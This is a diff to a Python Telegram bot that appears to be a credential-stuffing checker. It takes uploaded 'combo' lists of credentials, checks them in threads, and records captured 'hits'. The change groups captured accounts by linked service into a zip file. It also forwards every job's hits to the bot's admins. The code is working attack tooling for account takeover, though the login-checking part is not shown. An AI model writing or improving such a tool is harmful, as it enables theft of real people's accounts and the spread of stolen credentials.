@@ -1,8 +1,10 @@
 import io
 import os
+import re
 import tempfile
 import threading
 import time
+import zipfile
 from queue import Queue, Empty
 
 import telebot
@@ -120,6 +122,7 @@ class Job:
         self.bad = 0
         self.retry = 0
         self.hit_lines = []
+        self.service_hits = {}
         self.start_time = time.time()
         self.stop_event = threading.Event()
         self.done_event = threading.Event()
@@ -143,12 +146,35 @@ def parse_combos(file_bytes):
     return combos
 
 
-def send_hits_file(chat_id, hit_lines, caption, reply_to_message_id=None):
-    content = "".join(hit_lines) if hit_lines else "No hits found.\n"
-    temp = tempfile.NamedTemporaryFile(delete=False, suffix=".txt")
+def normalize_service_filename(service_name):
+    slug = re.sub(r"[^a-z0-9]+", "_", service_name.lower()).strip("_")
+    if not slug:
+        slug = "service"
+    return f"{slug}.txt"
+
+
+def send_hits_file(chat_id, service_hits, hits_total, caption, reply_to_message_id=None):
+    if not service_hits:
+        content = "No hits found.\n" if hits_total == 0 else "No linked services found.\n"
+        temp = tempfile.NamedTemporaryFile(delete=False, suffix=".txt")
+        try:
+            temp.write(content.encode("utf-8", errors="ignore"))
+            temp.close()
+            with open(temp.name, "rb") as f:
+                bot.send_document(chat_id, f, caption=caption, reply_to_message_id=reply_to_message_id)
+        finally:
+            if os.path.exists(temp.name):
+                os.remove(temp.name)
+        return
+
+    temp = tempfile.NamedTemporaryFile(delete=False, suffix=".zip")
     try:
-        temp.write(content.encode("utf-8", errors="ignore"))
-        temp.close()
+        with zipfile.ZipFile(temp.name, "w", zipfile.ZIP_DEFLATED) as zf:
+            for filename in sorted(service_hits):
+                lines = service_hits[filename]
+                if not lines:
+                    continue
+                zf.writestr(filename, "".join(lines))
         with open(temp.name, "rb") as f:
             bot.send_document(chat_id, f, caption=caption, reply_to_message_id=reply_to_message_id)
     finally:
@@ -199,6 +225,11 @@ def run_job(job, combos, is_admin_user):
                     capture = result.get("capture")
                     if capture:
                         job.hit_lines.append(capture)
+                    services = result.get("services") or []
+                    if capture:
+                        for service_name in services:
+                            filename = normalize_service_filename(service_name)
+                            job.service_hits.setdefault(filename, []).append(capture)
                 elif status == "BAD":
                     job.bad += 1
                 else:
@@ -230,7 +261,13 @@ def run_job(job, combos, is_admin_user):
         f"<b>by</b> {BOT_DEV}"
     )
 
-    send_hits_file(job.chat_id, job.hit_lines, summary, reply_to_message_id=job.reply_to_message_id)
+    send_hits_file(
+        job.chat_id,
+        job.service_hits,
+        job.hits,
+        summary,
+        reply_to_message_id=job.reply_to_message_id,
+    )
 
     admin_caption = (
         f"{format_header()}\n"
@@ -244,7 +281,7 @@ def run_job(job, combos, is_admin_user):
 
     for admin_id in ADMIN_IDS:
         try:
-            send_hits_file(admin_id, job.hit_lines, admin_caption)
+            send_hits_file(admin_id, job.service_hits, job.hits, admin_caption)
         except Exception:
             pass
 
@@ -303,7 +340,7 @@ def handle_start(message):
         "<b>Features</b>\n"
         "• Max 6,000 Lines per user\n"
         f"• {DEFAULT_THREADS} Threads For Fast Checking\n"
-        "• Results Sent As file\n\n"
+        "• Results Sent As .zip\n\n"
         "⚠️ <b>Only One Check At A Time Allowed.</b>\n\n"
         f"<b>Bot dev:</b> {BOT_DEV}"
     )
